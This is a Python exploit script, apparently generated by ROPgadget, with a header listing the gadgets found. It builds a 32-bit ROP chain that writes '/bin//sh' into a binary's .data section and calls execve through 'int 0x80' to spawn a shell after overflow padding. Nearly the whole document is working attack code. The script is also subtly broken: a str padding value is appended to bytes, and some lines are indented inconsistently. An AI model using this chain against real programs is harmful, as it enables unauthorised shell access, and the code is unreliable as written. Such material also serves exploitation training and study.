"""- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x8056e65 mov dword ptr [edx], eax ; ret
        [+] Gadget found: 0x806ee6b pop edx ; ret
        [+] Gadget found: 0x8056334 pop eax ; pop edx ; pop ebx ; ret
        [+] Gadget found: 0x8056420 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x8056420 xor eax, eax ; ret
        [+] Gadget found: 0x807c2fa inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x80481c9 pop ebx ; ret
        [+] Gadget found: 0x806ee92 pop ecx ; pop ebx ; ret
        [+] Gadget found: 0x806ee6b pop edx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x8049563 int 0x80

- Step 5 -- Build the ROP chain"""

#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''
p += 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A'
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b'/bin'
        p += pack('<I', 0x080da060) # padding without overwrite edx
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b'//sh'
        p += pack('<I', 0x080da064) # padding without overwrite edx
        p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
        p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x80

